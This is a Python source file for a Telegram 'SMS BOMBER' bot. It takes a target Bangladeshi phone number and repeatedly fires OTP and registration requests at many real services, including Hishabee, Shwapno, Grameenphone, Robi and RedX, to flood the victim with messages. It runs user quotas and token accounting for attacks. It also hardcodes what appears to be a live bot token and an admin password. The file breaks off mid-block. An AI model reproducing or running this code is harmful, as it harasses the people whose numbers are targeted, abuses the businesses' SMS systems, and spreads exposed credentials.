#!/usr/bin/env python3
import requests
import time
import os
import sys
import json
import threading
import atexit
import signal
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Suppress warnings
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== FLASK APP ====================
from flask import Flask
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "🔥 SMS BOMBER BOT is running on Render!"

@app.route('/health')
def health():
    return "OK", 200
# =================================================================================

# Bot configuration
BOT_TOKEN = "8781609298:AAFtzZb3M4rdoUnnmmdCxFJvjSpyFezMFzc"
ADMIN_PASS = "A3braham"

# File paths for data storage
USERS_FILE = "bot_users.json"
STATS_FILE = "bot_stats.json"
LOG_FILE = "bot_activity.json"
SUPER_USERS_FILE = "super_users.json"
TOKENS_FILE = "user_tokens.json"

# Global variables
active_attacks = {}
bot_users = {}
super_users = []
bot_stats = {
    'total_users': 0,
    'total_attacks': 0,
    'total_messages': 0,
    'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    'server_status': 'ONLINE'
}
user_tokens = {}  # {user_id: {"extra_tokens": int, "daily_free_used": int, "last_daily_reset": str}}

# Server shutdown flag
server_is_shutting_down = False
shutdown_initiated = False

# Load saved data
def load_data():
    global bot_users, bot_stats, super_users, user_tokens
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                bot_users = json.load(f)
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                bot_stats = json.load(f)
        if os.path.exists(SUPER_USERS_FILE):
            with open(SUPER_USERS_FILE, 'r', encoding='utf-8') as f:
                super_users = json.load(f)
        if os.path.exists(TOKENS_FILE):
            with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
                user_tokens = json.load(f)
    except Exception as e:
        log_activity(f"Error loading data: {e}")

# Save data
def save_data():
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_users, f, indent=2, ensure_ascii=False)
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_stats, f, indent=2, ensure_ascii=False)
        with open(SUPER_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(super_users, f, indent=2, ensure_ascii=False)
        with open(TOKENS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_tokens, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log_activity(f"Error saving data: {e}")

# Log activity
def log_activity(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clean_message = message.encode('ascii', 'ignore').decode('ascii')
    log_entry = f"[{timestamp}] {clean_message}\n"
    print(log_entry, end='')
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            json.dump({'timestamp': timestamp, 'message': message}, f)
            f.write('\n')
    except:
        pass

# Clear terminal and show header
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("="*60)
    print("          🔥 SMS BOMBER SERVER 🔥")
    print("          Developed by Mr.MorningStar")
    print("="*60)
    print(f"  Server Status: ONLINE")
    print(f"  Start Time: {bot_stats['start_time']}")
    print(f"  Super Users: {len(super_users)}")
    print("="*60)
    print("")

# Notify all users
def notify_all_users(message):
    count = 0
    failed = 0
    for user_id, user_data in bot_users.items():
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': int(user_id),
                'text': message,
                'parse_mode': 'Markdown'
            })
            count += 1
            time.sleep(0.05)
        except Exception as e:
            failed += 1
    log_activity(f"Broadcast sent to {count} users (failed: {failed})")

# Admin force stop all attacks
def admin_stop_all():
    count = len(active_attacks)
    if count > 0:
        for user_id in list(active_attacks.keys()):
            active_attacks[user_id]['stop'] = True
        log_activity(f"ADMIN: Force stopped all {count} active attacks")
        print(f"\n✅ Force stopped {count} active attacks")

# Terminal command handler
def terminal_commands():
    while not server_is_shutting_down:
        try:
            cmd = input().strip()
            if cmd.startswith("broadcast "):
                msg = cmd[10:]
                print(f"\n📢 Broadcasting: {msg}")
                notify_all_users(msg)
            elif cmd == "stats":
                print(f"\n📊 Server Stats:")
                print(f"   Total Users: {bot_stats['total_users']}")
                print(f"   Total Attacks: {bot_stats['total_attacks']}")
                print(f"   Active Attacks: {len(active_attacks)}")
                print(f"   Super Users: {len(super_users)}")
            elif cmd == "users":
                print(f"\n👥 User List:")
                for uid, data in bot_users.items():
                    super_status = "⭐ SUPER" if int(uid) in super_users else "👤 NORMAL"
                    token_balance = user_tokens.get(uid, {}).get("extra_tokens", 0)
                    print(f"   {data['first_name']} (@{data['username']}) - {super_status} - Attacks: {data['total_attacks']} - Tokens: {token_balance}")
            elif cmd == "stopall":
                admin_stop_all()
            elif cmd == "help":
                print("\n📋 Terminal Commands:")
                print("   broadcast <msg> - Send message to all users")
                print("   stats - Show server statistics")
                print("   users - List all users")
                print("   stopall - Force stop ALL active attacks")
                print("   clear - Clear screen")
                print("   exit - Stop server")
            elif cmd == "clear":
                clear_screen()
            elif cmd == "exit":
                print("\n🛑 Stopping server from terminal...")
                server_shutdown()
                os._exit(0)
            elif cmd != "":
                print(f"Unknown command: {cmd}. Type 'help' for available commands.")
        except EOFError:
            break
        except Exception as e:
            log_activity(f"Terminal command error: {e}")

# Server shutdown handler
def server_shutdown():
    global server_is_shutting_down, shutdown_initiated
    if server_is_shutting_down or shutdown_initiated:
        return
    shutdown_initiated = True
    server_is_shutting_down = True
    
    if bot_stats['server_status'] == 'ONLINE':
        bot_stats['server_status'] = 'OFFLINE'
        save_data()
        for user_id in list(active_attacks.keys()):
            active_attacks[user_id]['stop'] = True
        
        if bot_stats.get('total_users', 0) > 0:
            shutdown_msg = (
                "🔴 **SERVER SHUTDOWN NOTICE**\n\n"
                "The bot server is going offline.\n"
                "All active attacks have been stopped.\n\n"
                "The bot will be back online soon!\n"
                "Thank you for using @MorningStar_Bot"
            )
            print("\n" + "="*60)
            print("SENDING SHUTDOWN NOTIFICATION TO ALL USERS...")
            print("="*60)
            notify_all_users(shutdown_msg)
            print("="*60)
            print("SERVER SHUTDOWN COMPLETE")
            print("="*60)
        log_activity("Server shutting down - All users notified")

# Signal handlers
def signal_handler(sig, frame):
    print("\n\nReceived shutdown signal...")
    server_shutdown()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def cleanup():
    if not shutdown_initiated:
        server_shutdown()

atexit.register(cleanup)

def format_phone_number(number):
    """Format phone number"""
    if not number.startswith("+88"):
        if number.startswith("88"):
            full_number = "+" + number
        else:
            full_number = "+88" + number
    else:
        full_number = number
    
    clean_number = full_number.replace("+88", "")
    return full_number, clean_number

def track_user(user_id, username, first_name):
    """Track user information"""
    user_id_str = str(user_id)
    if user_id_str not in bot_users:
        bot_users[user_id_str] = {
            'username': username,
            'first_name': first_name,
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_attacks': 0,
            'total_messages': 0,
            'last_attack_date': None,
            'daily_attacks': 0
        }
        # Initialize token data for new user (3 free uses, one-time only)
        if user_id_str not in user_tokens:
            user_tokens[user_id_str] = {
                "extra_tokens": 0,
                "free_uses_left": 3  # One-time 3 free uses, never resets
            }
        bot_stats['total_users'] = len(bot_users)
        log_activity(f"New user! {username or first_name} (Total users: {bot_stats['total_users']})")
        save_data()
    else:
        bot_users[user_id_str]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bot_users[user_id_str]['total_messages'] += 1
        save_data()

def can_attack(user_id):
    """Check if user can attack based on limits and tokens"""
    user_id_str = str(user_id)
    
    # Super users (admin only) have unlimited attacks
    if user_id in super_users:
        return True, "Unlimited access (Super User)"
    
    # Initialize token data if not exists
    if user_id_str not in user_tokens:
        user_tokens[user_id_str] = {
            "extra_tokens": 0,
            "free_uses_left": 3  # One-time 3 free uses
        }
        save_data()
    
    user_token = user_tokens[user_id_str]
    
    # Migration: if old data format, add free_uses_left
    if "free_uses_left" not in user_token:
        user_token["free_uses_left"] = 3
        save_data()
    
    # Check one-time free uses (3 total, not daily)
    free_left = user_token.get("free_uses_left", 0)
    if free_left > 0:
        return True, f"Using free use ({3 - free_left + 1}/3)"
    else:
        # Check extra tokens
        if user_token.get("extra_tokens", 0) > 0:
            return True, f"Using extra token ({user_token['extra_tokens'] - 1} remaining)"
        else:
            return False, "No tokens left. Use /apply <reason> or contact admin @morningstarspice"

def increment_attack_count(user_id):
    """Increment attack counter and deduct tokens if needed"""
    user_id_str = str(user_id)
    
    # Update user stats
    if user_id_str in bot_users:
        today = datetime.now().strftime("%Y-%m-%d")
        if bot_users[user_id_str].get('last_attack_date') != today:
            bot_users[user_id_str]['daily_attacks'] = 1
            bot_users[user_id_str]['last_attack_date'] = today
        else:
            bot_users[user_id_str]['daily_attacks'] = bot_users[user_id_str].get('daily_attacks', 0) + 1
        save_data()
    
    # Deduct token if not super user
    if user_id not in super_users:
        if user_id_str not in user_tokens:
            user_tokens[user_id_str] = {"extra_tokens": 0, "free_uses_left": 3}
        
        # First use free uses (one-time 3)
        if user_tokens[user_id_str].get("free_uses_left", 0) > 0:
            user_tokens[user_id_str]["free_uses_left"] -= 1
        # Then use extra tokens
        elif user_tokens[user_id_str].get("extra_tokens", 0) > 0:
            user_tokens[user_id_str]["extra_tokens"] -= 1
        save_data()

def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, username):
    """Run bombing with all sites"""
    session = requests.Session()
    cycle_num = 0
    success = 0
    failed = 0
    MAX_CYCLES = 3
    
    # Update user stats
    user_id_str = str(user_id)
    if user_id_str in bot_users:
        bot_users[user_id_str]['total_attacks'] += 1
        bot_stats['total_attacks'] += 1
        save_data()
    
    log_activity(f"Attack started by {username} on {full_number}")
    
    # Send initial message
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
            'chat_id': chat_id,
            'text': f"⏱️ **Attack will auto-stop after {MAX_CYCLES} cycles**",
            'parse_mode': 'Markdown'
        })
    except:
        pass
    
    try:
        while user_id in active_attacks and not active_attacks[user_id].get('stop', False) and not server_is_shutting_down and cycle_num < MAX_CYCLES:
            cycle_num += 1
            cycle_success = 0
            cycle_failed = 0
            
            # Small delay to avoid rate limiting (helps on free hosts like Render)
            time.sleep(1)
            
            # Send cycle start
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': f"🔄 **CYCLE {cycle_num}/{MAX_CYCLES} STARTED**",
                    'parse_mode': 'Markdown',
                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP ATTACK', 'callback_data': f'stop_{user_id}'}]]})
                })
            except:
                pass

            # 1. Hishabee API (UPDATED)
            try:
                time.sleep(0.5)  # Small delay to avoid rate limiting on free hosts
                url_hishabee = "https://app.hishabee.business/api/V2/otp/send"
                params_hishabee = {
                    "mobile_number": clean_number,
                    "country_code": "88"
                }
                headers_hishabee = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
                    'origin': 'https://web.hishabee.business',
                    'platform': 'WEB',
                    'referer': 'https://web.hishabee.business/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                res = session.post(url_hishabee, params=params_hishabee, headers=headers_hishabee, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"📊 **Hishabee** → `OTP Sent` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"📊 **Hishabee** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "📊 **Hishabee** → `Error` 💥",
                    'parse_mode': 'Markdown'
                })

            # 2. Bohubrihi API (UPDATED)
            try:
                time.sleep(0.5)  # Small delay to avoid rate limiting
                url_bohubrihi = "https://bb-api.bohubrihi.com/public/activity/otp"
                headers_bohubrihi = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
                    'authorization': 'Bearer undefined',
                    'content-type': 'application/json',
                    'origin': 'https://bohubrihi.com',
                    'referer': 'https://bohubrihi.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_bohubrihi = {
                    "phone": clean_number,
                    "intent": "login"
                }
                res = session.post(url_bohubrihi, json=data_bohubrihi, headers=headers_bohubrihi, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"🎭 **Bohubrihi** → `OTP Triggered` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"🎭 **Bohubrihi** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "🎭 **Bohubrihi** → `Error` 💥",
                    'parse_mode': 'Markdown'
                })

            # 3. Swapno API (UPDATED)
            try:
                time.sleep(0.5)  # Small delay to avoid rate limiting
                url_swapno = "https://www.shwapno.com/api/auth"
                swapno_number = f"+88{clean_number}"
                headers_swapno = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
                    'content-type': 'application/json',
                    'origin': 'https://www.shwapno.com',
                    'referer': 'https://www.shwapno.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                data_swapno = {
                    "phoneNumber": swapno_number
                }
                res = session.post(url_swapno, json=data_swapno, headers=headers_swapno, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"🛒 **Swapno** → `OTP Sent` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"🛒 **Swapno** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "🛒 **Swapno** → `Error` 💥",
                    'parse_mode': 'Markdown'
                })

            # 4. Sundarban
            try:
                url_sundarban = "https://api-gateway.sundarbancourierltd.com/graphql"
                headers_sundarban = {
                    'accept': '*/*',
                    'content-type': 'application/json',
                    'origin': 'https://customer.sundarbancourierltd.com',
                    'referer': 'https://customer.sundarbancourierltd.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_sundarban = {
                    "operationName": "CreateAccessToken",
                    "variables": {
                        "accessTokenFilter": {
                            "userName": f"0{clean_number}"
                        }
                    },
                    "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
                        createAccessToken(accessTokenFilter: $accessTokenFilter) {
                            message
                            statusCode
                            result {
                                phone
                                otpCounter
                                __typename
                            }
                            __typename
                        }
                    }"""
                }
                res = session.post(url_sundarban, json=data_sundarban, headers=headers_sundarban, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"📦 **Sundarban** → `OTP Triggered` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"📦 **Sundarban** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Sundarban] ✗ Failed"
                })

            # 5. Bioscope
            try:
                url_bioscope = "https://api-dynamic.bioscopelive.com/v2/auth/login"
                params_bioscope = {"country": "BD", "platform": "web", "language": "en"}
                headers_bioscope = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.bioscopeplus.com',
                    'referer': 'https://www.bioscopeplus.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_bioscope = {"number": f"+88{clean_number}"}
                res = session.post(url_bioscope, params=params_bioscope, json=data_bioscope, headers=headers_bioscope, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"🎬 **Bioscope** → `OTP Sent` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"🎬 **Bioscope** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Bioscope] ✗ Failed"
                })

            # 6. RedX
            try:
                url_redx = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
                headers_redx = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://redx.com.bd',
                    'referer': 'https://redx.com.bd/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                data_redx = {"phoneNumber": clean_number}
                res = session.post(url_redx, json=data_redx, headers=headers_redx, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"📦 **RedX** → `OTP Sent` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"📦 **RedX** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[RedX] ✗ Failed"
                })

            # 7. Robi WiFi
            try:
                url_robi = "https://robiwifi-mw.robi.com.bd/fwa/wifi/api/v1/primary-phone/send-otp"
                headers_robi = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': 'https://robiwifi.robi.com.bd',
                    'Referer': 'https://robiwifi.robi.com.bd/',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_robi = {
                    "requestId": None,
                    "phone": clean_number
                }
                res = session.post(url_robi, json=data_robi, headers=headers_robi, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"📶 **Robi WiFi** → `OTP Sent` ✨ `{res.status_code}`"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"📶 **Robi WiFi** → `Failed` ⚠️ `{res.status_code}`"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text,
                    'parse_mode': 'Markdown'
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Robi WiFi] ✗ Failed"
                })

            # 8. Bikroy
            try:
                url_bikroy = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={clean_number}"
                res = session.get(url_bikroy, headers={"application-name": "web"}, timeout=5)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Bikroy] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Bikroy] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Bikroy] ✗ Failed"
                })

            # 9. GPFI
            try:
                url_gp = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
                headers_gp = {
                    'Content-Type': 'application/json',
                    'Origin': 'https://gpfi.grameenphone.com',
                    'Referer': 'https://gpfi.grameenphone.com/',
                    'User-Agent': 'Mozilla/5.0'
                }
                res = session.post(url_gp, json={"phone": raw_number, "email": "", "language": "en"}, headers=headers_gp, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[GPFI] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[GPFI] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[GPFI] ✗ Failed"
                })

            # 10. Paperfly
            try:
                url_pf = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
                data_pf = {"full_name": "Morning Star", "company_name": "abcd", "email_address": "ms@gmail.com", "phone_number": raw_number}
                res = session.post(url_pf, json=data_pf, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Paperfly] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Paperfly] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Paperfly] ✗ Failed"
                })

            # 11. Osudpotro
            try:
                url_osudhpotro = 'https://api.osudpotro.com/api/v1/users/send_otp'
                headers_osudhpotro = {
                    'content-type': 'application/json',
                    'origin': 'https://osudpotro.com',
                    'referer': 'https://osudpotro.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data = {
                    "mobile":"+88-"+raw_number,
                    "deviceToken": "web",
                    "language":  "en",
                    "os": "web"
                }
                res = session.post(url_osudhpotro, headers=headers_osudhpotro, json=data)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Osudpotro] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Osudpotro] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Osudpotro] ✗ Failed"
                })

            # 12. Sikho
            try:
                url_sikho = 'https://api.shikho.com/auth/v2/send/sms'
                headers_sikho = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://shikho.com',
                    'referer': 'https://shikho.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data = {
                    "phone":"88"+raw_number,
                    "type":"student",
                    "auth_type":"signup",
                    "vendor":"shikho"
                }
                res = session.post(url_sikho, headers=headers_sikho, json=data)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Sikho] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Sikho] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Sikho] ✗ Failed"
                })

            # 13. KireiBD
            try:
                url_kirei = "https://frontendapi.kireibd.com/api/v2/send-login-otp"
                headers_kirei = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://kireibd.com',
                    'referer': 'https://kireibd.com/',
                    'user-agent': 'Mozilla/5.0',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data_kirei = {"email": clean_number}
                res = session.post(url_kirei, json=data_kirei, headers=headers_kirei, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[KireiBD] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[KireiBD] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[KireiBD] ✗ Failed"
                })

            # 14. Iqra Live
            try:
                url_iqra = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_number}"
                headers_iqra = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json'
                }
                res = session.get(url_iqra, headers=headers_iqra, timeout=5)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Iqra Live] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Iqra Live] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Iqra Live] ✗ Failed"
                })

            # 15. Swap
            try:
                url_swap = "https://api.swap.com.bd/api/v1/send-otp/v2"
                headers_swap = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': 'https://swap.com.bd',
                    'Referer': 'https://swap.com.bd/',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_swap = {"phone": clean_number}
                res = session.post(url_swap, json=data_swap, headers=headers_swap, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Swap] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Swap] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Swap] ✗ Failed"
                })

            # 16. Easy.com
            try:
                url_easy = "https://core.easy.com.bd/api/v1/registration"
                headers_easy = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/json'
                }
                data_easy = {
                    "password": "easy123",
                    "password_confirmation": "easy123",
                    "device_key": "44818de9280e1419d3d63a2b65d8c33d",
                    "name": "User",
                    "mobile": clean_number,
                    "social_login_id": "",
                    "email": "user@gmail.com"
                }
                res = session.post(url_easy, json=data_easy, headers=headers_easy, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Easy.com] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Easy. com] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Easy.com] ✗ Failed"
                })

            # 17. Binge Buzz
            try:
                binge_urls = [
                    "https://api.binge.buzz/api/v4/auth/otp/send",
                    "https://api.binge.buzz/api/v3/auth/otp/send",
                    "https://api.binge.buzz/api/v2/auth/otp/send",
                    "https://api.binge.buzz/v1/auth/otp/send"
                ]
                
                binge_headers = {
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'origin': 'https://binge.buzz',
                    'referer': 'https://binge.buzz/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'x-platform': 'web'
                }
                
                binge_data = {"phone": f"+88{clean_number}"}
                binge_success = False
                
                for url in binge_urls:
                    try:
                        res = session.post(url, json=binge_data, headers=binge_headers, timeout=5)
                        if res.status_code in [200, 201, 202]:
                            binge_success = True
                            cycle_success += 1
                            success += 1
                            status_text = f"[Binge] ✓ {res.status_code}"
                            break
                        elif res.status_code == 404:
                            continue
                        else:
                            binge_success = True
                            cycle_success += 1
                            success += 1
                            status_text = f"[Binge] ✓ {res.status_code}"
                            break
                    except:
                        continue
                
                if not binge_success:
                    cycle_failed += 1
                    failed += 1
                    status_text = "[Binge] ✗ Failed"
                    
            except:
